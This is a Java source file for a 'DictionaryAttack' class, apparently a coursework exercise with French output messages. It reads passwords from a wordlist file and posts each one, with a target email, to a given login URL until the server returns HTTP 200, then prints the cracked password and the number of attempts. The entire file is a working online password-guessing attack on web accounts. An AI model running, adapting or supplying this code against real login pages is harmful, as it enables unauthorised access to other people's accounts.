
// import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.*;

public class DictionaryAttack implements Cracker  {
    HttpClientPostForm http = new HttpClientPostForm();
    int compteur = 0;
    @Override
    public void hack(String url, String email) {
        try {
            FileInputStream file = new FileInputStream("dictionaire.txt");
            Scanner myReader = new Scanner(file);
            boolean bool =false;
            
            while (myReader.hasNextLine()) {
                String password = myReader.nextLine();
                compteur++;
                try {
                    if((http.getPassword(url, email, password)==200)) {
                        System.out.println("mot de passe trouve : " + password + "\n nombre de tentative  " + compteur );
                        bool=true;
                        break;
                    }
                } catch (IOException e) {
                    
                    e.printStackTrace();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                
            }
            if(!bool) {
                System.out.println("Password not foud");
            }
            myReader.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }

    }

